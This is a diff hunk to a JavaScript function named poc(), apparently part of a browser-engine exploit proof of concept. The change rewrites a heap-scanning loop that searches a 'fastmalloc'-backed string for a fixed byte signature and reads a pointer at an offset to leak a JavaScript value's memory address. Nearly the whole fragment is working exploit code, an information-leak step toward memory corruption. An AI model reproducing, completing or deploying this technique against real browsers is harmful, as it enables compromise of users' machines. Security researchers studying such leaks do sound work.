@@ -182,24 +182,20 @@ function poc() {
         });
     }
 
-    var jsvalue_leak = null;
-
-    while (jsvalue_leak === null) {
-        Object.defineProperties({}, props);
-        for (var i = 0;; i++) {
-            if (fastmalloc.charCodeAt(i) == 0x42 &&
-                fastmalloc.charCodeAt(i + 1) == 0x44 &&
-                fastmalloc.charCodeAt(i + 2) == 0x43 &&
-                fastmalloc.charCodeAt(i + 3) == 0x41 &&
-                fastmalloc.charCodeAt(i + 4) == 0 &&
-                fastmalloc.charCodeAt(i + 5) == 0 &&
-                fastmalloc.charCodeAt(i + 6) == 254 &&
-                fastmalloc.charCodeAt(i + 7) == 255 &&
-                fastmalloc.charCodeAt(i + 24) == 14
-            ) {
-                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
-                break;
-            }
+    Object.defineProperties({}, props);
+    for (var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i += 16) {
+        if (fastmalloc.charCodeAt(i) == 0x42 &&
+            fastmalloc.charCodeAt(i + 1) == 0x44 &&
+            fastmalloc.charCodeAt(i + 2) == 0x43 &&
+            fastmalloc.charCodeAt(i + 3) == 0x41 &&
+            fastmalloc.charCodeAt(i + 4) == 0 &&
+            fastmalloc.charCodeAt(i + 5) == 0 &&
+            fastmalloc.charCodeAt(i + 6) == 254 &&
+            fastmalloc.charCodeAt(i + 7) == 255 &&
+            fastmalloc.charCodeAt(i + 24) == 14
+        ) {
+            var jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+            break;
         }
     }
 
